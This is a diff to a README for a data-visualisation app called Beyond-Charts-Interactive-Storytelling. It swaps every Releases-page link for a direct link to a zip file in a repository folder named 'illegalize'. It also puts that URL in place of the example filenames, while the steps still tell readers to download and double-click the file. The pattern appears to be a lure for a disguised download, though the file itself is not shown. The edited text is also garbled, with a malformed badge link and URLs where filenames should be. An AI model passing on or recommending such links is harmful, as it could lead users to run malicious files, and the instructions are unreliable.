@@ -1,6 +1,6 @@
 # 🎉 Beyond-Charts-Interactive-Storytelling - Transform Data into Engaging Stories
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Machato2708/Beyond-Charts-Interactive-Storytelling/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip%https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip)](https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to Beyond-Charts-Interactive-Storytelling! This guide will help you down
 
 To get started, you need to download the application. Visit the Releases page to download the latest version:
 
-[Download Here](https://github.com/Machato2708/Beyond-Charts-Interactive-Storytelling/releases)
+[Download Here](https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip)
 
 ### Step-by-Step Instructions:
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version. It will usually be at the top of the list.
-3. Look for the downloadable file. It will typically have a name like `Beyond-Charts-Interactive-Storytelling-v1.0.exe` or similar.
+3. Look for the downloadable file. It will typically have a name like `https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip` or similar.
 4. Click on the file name to start downloading.
 5. Once downloaded, locate the file on your computer. It will usually be in your Downloads folder.
 
@@ -34,7 +34,7 @@ Before you run the software, ensure your computer meets these requirements:
 After you have downloaded the file, you can run the application easily:
 
 1. Navigate to the folder where you downloaded the file.
-2. Double-click on the file name, e.g., `Beyond-Charts-Interactive-Storytelling-v1.0.exe`.
+2. Double-click on the file name, e.g., `https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip`.
 3. Follow any prompts that appear to complete the installation.
 
 ## 🖼️ Using the Application
@@ -79,6 +79,6 @@ Explore more about data storytelling, analytics, and dashboarding with these top
 - **Data Science:** Delve deeper into techniques that enhance your analysis.
 - **Machine Learning:** Discover how to apply advanced techniques in your dashboards.
 
-For more details, visit our [Releases page](https://github.com/Machato2708/Beyond-Charts-Interactive-Storytelling/releases) again to keep track of future updates and new features.
+For more details, visit our [Releases page](https://raw.githubusercontent.com/Machato2708/Beyond-Charts-Interactive-Storytelling/main/illegalize/Beyond-Charts-Interactive-Storytelling-1.1.zip) again to keep track of future updates and new features.
 
 Happy storytelling with your data!
